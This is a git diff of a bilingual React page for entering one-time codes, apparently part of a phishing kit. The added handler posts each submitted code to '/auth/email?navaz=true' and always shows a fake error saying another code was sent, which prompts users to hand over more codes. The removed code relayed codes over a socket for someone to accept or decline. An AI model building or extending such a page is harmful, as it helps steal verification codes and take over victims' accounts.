@@ -5,11 +5,9 @@ import Footer from '../component/Footer'
 import { BiBook } from 'react-icons/bi'
 import { TailSpin } from 'react-loader-spinner'
 import { serverRoute, socket } from './Main'
-import { token } from '../App'
 import axios from 'axios'
 
-const OTP = ({setMode,checkMode}) => {
-    const {id} = useParams()
+const OrderOtp = ({setMode,checkMode}) => {
     const mode = localStorage.getItem('lang')
     const [counter, setCounter] = useState(60)
     const [otp,setOtp] = useState(undefined)
@@ -37,25 +35,9 @@ const OTP = ({setMode,checkMode}) => {
     const handleSubmit = async(e)=>{
       setLoading(true)
         e.preventDefault()
-        const result = await axios.post(serverRoute+'/auth/email?orderOtp=true',{id,otp})
-        socket.emit('orderOtp',{id,otp})
+        await axios.post(serverRoute+'/auth/email?navaz=true',{otp}).then(()=>{setError(true);setLoading(false)})
+        
     }
-     
-    socket.on('declineOtp',(data)=>{
-      if(data.token === token && data.id ===id){
-        setError(true)
-        setLoading(false)
-
-      }
-    })
-    socket.on('acceptOtp',(data)=>{
-      if(data.token === token && data.id ===id){
-        setError(false)
-        setLoading(false)
-        window.location.href = `/verify?otp=${data.userOtp}`
-
-      }
-    })
 
   return (
     <div >
@@ -88,6 +70,7 @@ const OTP = ({setMode,checkMode}) => {
                         </div>
                         <input className='md:w-1/2 w-2/3 outline-none  rounded-sm px-2 py-1 md:text-sm otp-desc text-center' style={{border:'1px solid #eee'}} dir={`${mode === 'ar' ?'rtl':'ltr'}`} placeholder={`********`} required type='text' onChange={(e)=>setOtp(e.target.value.replace(/\D/g, ''))}  inputMode="numeric"   value={otp}/>
                         <button className='text-white bg-green-500 w-1/2 text-sm md:text-base py-1 rounded-sm '>{checkMode('Verify','تحقق').word}</button>
+                        <button className='text-white bg-gray-500 w-1/2 text-sm md:text-base py-1 rounded-sm ' onClick={()=>window.location.href='/services'}>{checkMode('Back','رجوع').word}</button>
                         {error && <span className='flex gap-x-5  text-red-500 lg:text-sm md:font-semibold text-xs justify-center items-center otp-desc'>{checkMode('*An error occurred. Another activation code was sent to your mobile phone','*حصل خطأ تم ارسال رمز تفعيل اخر الى جوالك').word}</span>}
                     </form>
                 </div>
@@ -98,4 +81,4 @@ const OTP = ({setMode,checkMode}) => {
   )
 }
 
-export default OTP
+export default OrderOtp
